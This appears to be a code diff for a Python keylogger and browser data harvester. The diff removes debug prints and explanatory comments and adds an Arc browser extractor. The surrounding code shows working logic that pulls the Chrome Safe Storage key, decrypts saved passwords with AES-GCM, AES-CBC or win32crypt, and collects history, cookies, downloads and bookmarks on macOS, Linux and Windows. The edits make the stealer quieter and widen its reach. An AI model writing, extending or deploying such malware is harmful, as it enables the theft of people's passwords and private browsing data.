@@ -63,12 +63,6 @@ class KeyLogger:
     """
     
     def __init__(self, interval=0):
-        """
-        Initialize the keylogger with specified settings.
-        
-        Args:
-            interval: Time between keylog uploads (if implemented)
-        """
         self.LOGGER_OUTPUT = LOGGER_OUTPUT
         self.COMPUTER_INFORMATION = COMPUTER_INFORMATION
         self.SCREENSHOT_DIRECTORY = SCREENSHOT_DIRECTORY
@@ -339,7 +333,7 @@ class ChromeBrowser(BrowserBase):
         kdf = import_module('Crypto.Protocol.KDF')
         self.key = kdf.PBKDF2(secret_pass_key, salt, length, iterations)
         
-        # Adjust Chrome paths for macOS - this is a common path structure
+        # Adjust Chrome paths for macOS
         user_home = os.path.expanduser("~")
         chrome_path = os.path.join(user_home, "Library", "Application Support", "Google", "Chrome")
         default_path = os.path.join(chrome_path, "Default")
@@ -363,10 +357,6 @@ class ChromeBrowser(BrowserBase):
         self.history_db = os.path.join(self.dbpath, "History")
         self.cookies_db = os.path.join(self.dbpath, "Cookies")
         self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")
-        
-        # Verify that the database files exist
-        print(f"Login Data path: {self.login_data_db} (exists: {os.path.exists(self.login_data_db)})")
-        print(f"History path: {self.history_db} (exists: {os.path.exists(self.history_db)})")
 
     def _win_chrome_init(self):
         """Initialize Chrome database paths on Windows"""
@@ -401,7 +391,6 @@ class ChromeBrowser(BrowserBase):
                 for item in collection.get_all_items():
                     if item.get_label() == 'Chrome Safe Storage':
                         secret_pass_key = item.get_secret()
-                        print("Successfully found Chrome key from secret storage")
                         break
             except ImportError:
                 print("secretstorage module not available, using fallback key")
@@ -434,7 +423,6 @@ class ChromeBrowser(BrowserBase):
             self.history_db = os.path.join(self.dbpath, "History")
             self.cookies_db = os.path.join(self.dbpath, "Cookies")
             self.bookmarks_file = os.path.join(self.dbpath, "Bookmarks")
-            print(f"Chrome database path on Linux: {self.dbpath}")
             
         except Exception as e:
             print(f"Error initializing Chrome on Linux: {e}")
@@ -466,12 +454,14 @@ class ChromeBrowser(BrowserBase):
                 except Exception as e:
                     print(f"AES-GCM decryption failed: {e}")
             
-            # For older Chrome versions or as fallback
+            # Fallback
             aes = import_module('Crypto.Cipher.AES')
             i_vector = b' ' * 16
+
             enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
             cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
             decrypted = cipher.decrypt(enc_passwd)
+
             return decrypted.strip().decode('utf8', errors='replace')
             
         except Exception as e:
@@ -493,7 +483,9 @@ class ChromeBrowser(BrowserBase):
         
         try:
             import win32crypt
+
             data = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)
+
             return data[1].decode('utf8')
         except Exception as e:
             print(f"Windows decryption error: {e}")
@@ -522,16 +514,19 @@ class ChromeBrowser(BrowserBase):
                 try:
                     aesgcm = AESGCM(self.key)
                     decrypted = aesgcm.decrypt(nonce, ciphertext, None)
+
                     return decrypted.decode('utf-8', errors='replace')
                 except Exception as e:
                     print(f"AES-GCM decryption failed: {e}")
             
-            # For older Chrome versions or as fallback
+            # Fallback
             aes = import_module('Crypto.Cipher.AES')
             i_vector = b' ' * 16
+
             enc_passwd = encrypted_data[3:] if len(encrypted_data) > 3 else encrypted_data
             cipher = aes.new(self.key, aes.MODE_CBC, IV=i_vector)
             decrypted = cipher.decrypt(enc_passwd)
+
             return decrypted.strip().decode('utf8', errors='replace')
             
         except Exception as e:
@@ -572,7 +567,6 @@ class ChromeBrowser(BrowserBase):
             if not temp_db:
                 return {'data': []}
                 
-            # Connect to the database
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             
@@ -607,7 +601,7 @@ class ChromeBrowser(BrowserBase):
             
             conn.close()
             self.passwords = data
-            print(f"Found {len(data['data'])} Chrome passwords")
+
             return data
             
         except Exception as e:
@@ -639,8 +633,7 @@ class ChromeBrowser(BrowserBase):
             temp_db = self._copy_db_file(self.history_db)
             if not temp_db:
                 return {'data': []}
-                
-            # Connect to the database
+            
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
             
@@ -663,7 +656,7 @@ class ChromeBrowser(BrowserBase):
                 try:
                     url, title, visit_count, last_visit_time, visit_time = result
                     
-                    # Convert Chrome timestamp (microseconds since Jan 1, 1601) to readable format
+                    # Convert Chrome timestamp to readable format
                     if last_visit_time:
                         chrome_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time)
                         last_visit_time = chrome_time.strftime('%Y-%m-%d %H:%M:%S')
@@ -755,7 +748,7 @@ class ChromeBrowser(BrowserBase):
             }
             result_list.append(entry)
         
-        # Process a folder (which may contain more bookmarks)
+        # Process a folder
         elif node.get('type') == 'folder':
             folder_name = node.get('name', '')
             new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
@@ -783,16 +776,15 @@ class ChromeBrowser(BrowserBase):
             if not temp_history:
                 return {'data': []}
             
-            # Connect to the database
             conn = sqlite3.connect(temp_history)
             cursor = conn.cursor()
             
-            # Step 1: Determine the schema of the downloads table
+            # Determine the schema of the downloads table
             cursor.execute("PRAGMA table_info(downloads)")
             columns = cursor.fetchall()
             column_names = [col[1] for col in columns]
             
-            # Step 2: Build a query based on the actual schema
+            # Build a query based on the actual schema
             select_fields = []
             if 'target_path' in column_names:
                 select_fields.append('downloads.target_path')
@@ -1145,7 +1137,7 @@ class BrowserDataHarvester:
         # Initialize browser extractors
         try:
             self.browser_instances['chrome'] = ChromeBrowser()
-            # Add more browsers here as they're implemented
+            self.browser_instances['arc'] = ArcBrowser()
             # self.browser_instances['firefox'] = FirefoxBrowser()
             # self.browser_instances['edge'] = EdgeBrowser()
         except Exception as e:
